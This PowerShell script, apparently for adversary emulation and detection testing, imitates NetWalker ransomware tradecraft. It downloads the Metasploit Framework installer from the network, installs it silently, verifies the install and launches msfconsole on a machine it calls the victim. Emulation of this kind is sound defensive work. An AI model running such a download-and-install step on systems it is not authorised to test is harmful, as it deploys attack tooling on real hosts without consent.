<#
    T1204.002 - User Execution: Malicious File
    T1588.001 - Obtain Capabilities: Malware
    T1059 - Command and Scripting Interpreter
    Download metasploitframework-latest.msi from https://windows.metasploit.com/metasploitframework-latest.msi and isntall it on the machine
    Installing the entire Metasploit framework on a (victim) Windows Server to move laterally, technique associated with NetWalker
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

# Download and install metasploitframework-latest.msi
$url = "https://windows.metasploit.com/metasploitframework-latest.msi"
$logfile = "$env:tmp\install_metasploit.log"
$dumpfile = "$env:tmp\metasploit.txt"
$outfile = "$env:tmp\msploit.msi"
try {
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $url -OutFile $outfile -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: Metasploit framework installer downloaded to $outfile" 
        Write-Host -ForegroundColor Cyan "Installing Metasploit framework installer..."
        $msi_args = @(
            "/i"
            $outfile
            "/qn"
            "/norestart"
            "/L*v"
            $logfile   
        )
        Start-Process "msiexec.exe" -ArgumentList $msi_args -Wait -NoNewWindow  -Verbose
        if (Test-Path $logfile){
            Write-Host -ForegroundColor Green "Metasploit Framework installation log is located at $logfile"
        }
        else{
            Write-Host -ForegroundColor Red "Error: Failed to create Metasploit framework installer log file at $logfile, something went wrong"
        }
        $check_reg = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object {$_.DisplayName -like "*metasploit*"}
        $check_folder = (Test-Path "$env:ProgramFiles\metasploit*") -or (Test-Path "${env:ProgramFiles(x86)}\metasploit*") -or (test-path "$env:ProgramW6432\metasploit*") -or (test-path "$env:HOMEDRIVE\metasploit*")
        $check_path_var = Get-ChildItem Env:Path | Select-Object Path -ExpandProperty Value | Select-String metasploit
        $list_folder = @("$env:ProgramFiles\metasploit*","${env:ProgramFiles(x86)}\metasploit*","$env:ProgramW6432\metasploit*","$env:HOMEDRIVE\metasploit*")
        if ($check_reg -or $check_folder -or $check_path_var){
            Write-Host -ForegroundColor Green "Success: Metasploit framework seem to be installed"
            foreach ($folder in $list_folder){
                if (Test-Path $folder){
                    Write-Host -ForegroundColor Green "Success: Metasploit framework found in $folder";$installed_folder = $folder
                    if (Test-Path "$folder\bin\msfconsole.bat"){
                        Write-Host -ForegroundColor Green "Success: Found msfconsole.bat in $folder\bin"
                        Write-Host -ForegroundColor Cyan "Launching msfconsole..."
                        Start-Process "$folder\bin\msfconsole.bat"
                        sleep 5
                        if((Get-Process cmd, ruby | Sort-Object Name -Unique).count -eq 2){
                            Write-Host -ForegroundColor Green "Success: msfconsole executed"
                        }
                        else{
                            Write-Host -ForegroundColor Red "Error: Failed to execute msfconsole"
                        }
                    }
                    else{
                        Write-Host -ForegroundColor Red "Error: Failed to find msfconsole.bat in $folder\bin, something went wrong"
                    }
                }
            }
            if (-not $installed_folder){
                Write-Host -ForegroundColor Red "Error: Failed to find Metasploit framework installation folder, something went wrong"
            }
        }

        else{
            Write-Host -ForegroundColor Red "Error: Failed to install Metasploit framework"
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download Metasploit framework installer to $outfile"
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "Error: $_"
}

Stop-Transcript
